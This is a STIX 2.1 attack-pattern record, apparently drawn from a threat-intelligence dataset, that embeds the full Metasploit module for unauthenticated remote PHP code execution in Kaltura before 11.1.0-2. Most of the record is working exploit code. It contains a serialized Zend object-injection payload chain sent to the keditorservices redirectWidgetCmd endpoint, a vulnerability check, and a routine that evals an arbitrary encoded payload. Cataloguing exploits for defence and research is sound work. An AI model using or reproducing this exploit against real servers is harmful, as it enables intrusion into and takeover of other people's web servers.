{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e79d4eff-7acc-4c43-a648-66401a8b17b8",
    "created": "2024-08-14T17:00:29.193405Z",
    "modified": "2024-08-14T17:00:29.193409Z",
    "name": "Kaltura Remote PHP Code Execution",
    "description": " This module exploits an Object Injection vulnerability in Kaltura. By exploiting this vulnerability, unauthenticated users can execute arbitrary code under the context of the web server user.  Kaltura has a module named keditorservices that takes user input and then uses it as an unserialized function parameter. The constructed object is based on the SektionEins Zend code execution POP chain PoC with a minor modification to ensure Kaltura processes it and the Zend_Log function's __destruct() method is called. Kaltura versions prior to 11.1.0-2 are affected by this issue.  This module was tested against Kaltura 11.1.0 installed on CentOS 6.8.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/kaltura_unserialize_rce.rb",
            "external_id": "kaltura_unserialize_rce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Kaltura Remote PHP Code Execution',\n      'Description'    => %q{\n        This module exploits an Object Injection vulnerability in Kaltura.\n        By exploiting this vulnerability, unauthenticated users can execute\n        arbitrary code under the context of the web server user.\n\n        Kaltura has a module named keditorservices that takes user input\n        and then uses it as an unserialized function parameter. The constructed\n        object is based on the SektionEins Zend code execution POP chain PoC,\n        with a minor modification to ensure Kaltura processes it and the\n        Zend_Log function's __destruct() method is called. Kaltura versions\n        prior to 11.1.0-2 are affected by this issue.\n\n        This module was tested against Kaltura 11.1.0 installed on CentOS 6.8.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Security-Assessment.com',             # discovery\n          'Mehmet Ince <mehmet@mehmetince.net>'  # msf module\n        ],\n      'References'      =>\n        [\n          ['EDB', '39563']\n        ],\n      'Privileged'      => false,\n      'Platform'        => ['php'],\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [ ['Automatic', {}] ],\n      'DisclosureDate'  => '2016-03-15',\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The target URI of the Kaltura installation', '/'])\n      ]\n    )\n  end\n\n  def check\n    r = rand_text_alpha(15 + rand(4))\n    cmd = \"print_r(#{r}).die()\"\n\n    p = \"\"\n    p << \"a:1:{s:1:\\\"z\\\";O:8:\\\"Zend_Log\\\":1:{s:11:\\\"\\00*\\00_writers\\\";\"\n    p << \"a:1:{i:0;O:20:\\\"Zend_Log_Writer_Mail\\\":5:{s:16:\\\"\\00*\\00_eventsToMail\\\";\"\n    p << \"a:1:{i:0;i:1;}s:22:\\\"\\00*\\00_layoutEventsToMail\\\";a:0:{}s:8:\\\"\\00*\\00_mail\\\";\"\n    p << \"O:9:\\\"Zend_Mail\\\":0:{}s:10:\\\"\\00*\\00_layout\\\";O:11:\\\"Zend_Layout\\\":3:{s:13:\\\"\\00*\\00_inflector\\\";\"\n    p << \"O:23:\\\"Zend_Filter_PregReplace\\\":2:{s:16:\\\"\\00*\\00_matchPattern\\\";s:7:\\\"/(.*)/e\\\";\"\n    p << \"s:15:\\\"\\00*\\00_replacement\\\";s:#{cmd.length.to_s}:\\\"#{cmd}\\\";}s:20:\\\"\\00*\\00_inflectorEnabled\\\";\"\n    p << \"b:1;s:10:\\\"\\00*\\00_layout\\\";s:6:\\\"layout\\\";}s:22:\\\"\\00*\\00_subjectPrependText\\\";N;}}};}\"\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php/keditorservices/redirectWidgetCmd'),\n      'vars_get' => {\n        'kdata' => Rex::Text.encode_base64(p)\n      }\n    )\n\n    if res && res.body.include?(r)\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    cmd = \"print_r(eval(base64_decode('#{Rex::Text.encode_base64(payload.encode)}'))).die()\"\n\n    p = \"\"\n    p << \"a:1:{s:1:\\\"z\\\";O:8:\\\"Zend_Log\\\":1:{s:11:\\\"\\00*\\00_writers\\\";\"\n    p << \"a:1:{i:0;O:20:\\\"Zend_Log_Writer_Mail\\\":5:{s:16:\\\"\\00*\\00_eventsToMail\\\";\"\n    p << \"a:1:{i:0;i:1;}s:22:\\\"\\00*\\00_layoutEventsToMail\\\";a:0:{}s:8:\\\"\\00*\\00_mail\\\";\"\n    p << \"O:9:\\\"Zend_Mail\\\":0:{}s:10:\\\"\\00*\\00_layout\\\";O:11:\\\"Zend_Layout\\\":3:{s:13:\\\"\\00*\\00_inflector\\\";\"\n    p << \"O:23:\\\"Zend_Filter_PregReplace\\\":2:{s:16:\\\"\\00*\\00_matchPattern\\\";s:7:\\\"/(.*)/e\\\";\"\n    p << \"s:15:\\\"\\00*\\00_replacement\\\";s:#{cmd.length.to_s}:\\\"#{cmd}\\\";}s:20:\\\"\\00*\\00_inflectorEnabled\\\";\"\n    p << \"b:1;s:10:\\\"\\00*\\00_layout\\\";s:6:\\\"layout\\\";}s:22:\\\"\\00*\\00_subjectPrependText\\\";N;}}};}\"\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php/keditorservices/redirectWidgetCmd'),\n      'vars_get' => {\n        'kdata' => Rex::Text.encode_base64(p)\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-15",
    "x_mitre_platforms": [
        "['php']"
    ]
}